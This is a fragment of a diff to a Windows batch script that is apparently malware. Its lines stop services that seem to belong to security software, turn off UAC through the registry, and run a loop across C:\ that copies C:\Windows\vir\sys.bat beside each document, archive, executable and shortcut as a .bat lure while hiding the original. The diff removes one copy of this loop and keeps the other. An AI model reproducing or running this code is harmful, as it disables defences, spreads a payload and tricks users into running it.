@@ -95,13 +95,6 @@ net stop NPFMntor
 net stop MskService
 net stop FireSvc 
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-cd ..
-cd ..
-cd ..
-for /f "delims=?" %%c in ('dir/s/b/a-d *.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
-copy /y  C:\Windows\vir\sys.bat %%c.bat
-attrib +r +s +h %%c
-)
 cd /d C:\
 for /f "delims=?" %%c in ('dir/s/b/a-d C:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
 copy /y  C:\Windows\vir\sys.bat %%c.bat
